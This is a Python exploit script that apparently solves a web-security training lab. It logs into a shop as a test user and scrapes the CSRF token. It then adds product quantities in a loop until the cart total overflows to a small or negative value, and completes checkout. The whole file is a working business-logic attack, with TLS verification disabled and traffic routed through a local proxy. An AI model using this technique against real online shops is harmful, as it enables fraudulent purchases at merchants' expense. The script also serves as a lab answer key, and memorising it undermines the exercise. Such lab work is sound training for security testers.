import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def get_csrf_token(session, url):
    res = session.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})
    
    if csrf_input:
        csrf_token = csrf_input.get('value')
        return csrf_token
    else:
        print("CSRF token not found in the HTML.")
        return None

def business_logic_exploit(session, url) :
    
    csrf_token = get_csrf_token(session, url+'/login')
    
    data = {'csrf':csrf_token, 'username':'wiener', 'password':'peter'}
    
    res = session.post(url+'/login', data=data, proxies=proxies, verify=False)
    
    if 'Log out' in res.text :
        print('You\'re log in as wiener!')
        
        price = 1000000000
        factor = 99
        cart_url = url+ '/cart'
                
        while abs(price) > 100 and ((abs(price)/99) >= 1337) :
            # productId=1&redir=PRODUCT&quantity=1
            data = {'productId':'1', 'redir':'PRODUCT', 'quantity':factor}
            session.post(cart_url, data=data, proxies=proxies, verify=False)
            
            res = session.get(cart_url, verify=False, proxies=proxies)
            
            # Find the total price
            pattern = r'<th>Total:</th>\s*<th>\$(-?[\d,.]+)</th>'

            matches = re.search(pattern, res.text)

            if matches:
                price = float(matches.group(1))
                print("Total Price:", price)
            else:
                print("Total price not found.")
            
        factor = int(abs(price)/1337) if (price > 1) else int(abs(price)/99)+1
        
        if factor > 1 :
            data = {'productId':'1', 'redir':'PRODUCT', 'quantity':factor}
            session.post(cart_url, data=data, proxies=proxies, verify=False)
            
        csrf_token = get_csrf_token(session, cart_url)
        data = {'csrf':csrf_token}
        checkout_url = url + '/cart/checkout'
        session.post(checkout_url, data=data, allow_redirects=False, proxies=proxies, verify=False)
        
        confirm_url = url + '/cart/order-confirmation?order-confirmed=true'
        r = session.get(confirm_url, verify=False, proxies=proxies)
        
        if 'Congratulations' in r.text :
            print('Congratulations you have solved the lab!')
        
    else :
        print('Failed to log in!')

if __name__ == "__main__" :
    try :
        url = sys.argv[1]
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    business_logic_exploit(session, url)